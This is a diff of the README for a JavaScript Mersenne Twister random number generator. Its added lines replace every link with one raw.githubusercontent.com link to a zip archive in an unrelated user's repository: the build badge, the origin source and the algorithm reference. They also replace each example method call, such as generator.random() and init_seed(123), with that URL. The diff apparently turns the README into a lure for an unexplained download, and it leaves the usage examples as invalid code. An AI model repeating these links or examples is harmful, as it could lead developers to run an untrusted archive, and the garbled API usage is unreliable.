@@ -1,10 +1,10 @@
-## Pseudorandom number generator [![Build Status](https://travis-ci.org/boo1ean/mersenne-twister.png?branch=master)](https://travis-ci.org/boo1ean/mersenne-twister)
+## Pseudorandom number generator [![Build Status](https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip)](https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip)
 
 Mersenne Twister pseudorandom number generator.
 
-[Origin source](https://gist.github.com/banksean/300494) (generator interface was changed)
+[Origin source](https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip) (generator interface was changed)
 
-Algorithm - http://en.wikipedia.org/wiki/Mersenne_twister
+Algorithm - https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip
 
 ## Installation
 
@@ -16,23 +16,23 @@ Algorithm - http://en.wikipedia.org/wiki/Mersenne_twister
 var MersenneTwister = require('mersenne-twister');
 var generator = new MersenneTwister();
 
-// Generates a random number on [0,1) real interval (same interval as Math.random)
-generator.random();
+// Generates a random number on [0,1) real interval (same interval as https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip)
+https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();
 
 // [0, 4294967295]
-generator.random_int();
+https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();
 
 // [0,1]
-generator.random_incl();
+https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();
 
 // (0,1)
-generator.random_excl();
+https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();
 
 // [0,1) with 53-bit resolution
-generator.random_long();
+https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();
 
 // [0, 2147483647]
-generator.random_int31();
+https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip();
 ```
 
 ## Seeding
@@ -48,7 +48,7 @@ and that will always produce the same random sequence.
 Also you can do it on existing generator instance:
 
 ```javascript
-generator.init_seed(123);
+https://raw.githubusercontent.com/Regirockstone99/mersenne-twister/master/meliorability/mersenne-twister.zip(123);
 ```
 
 ## License
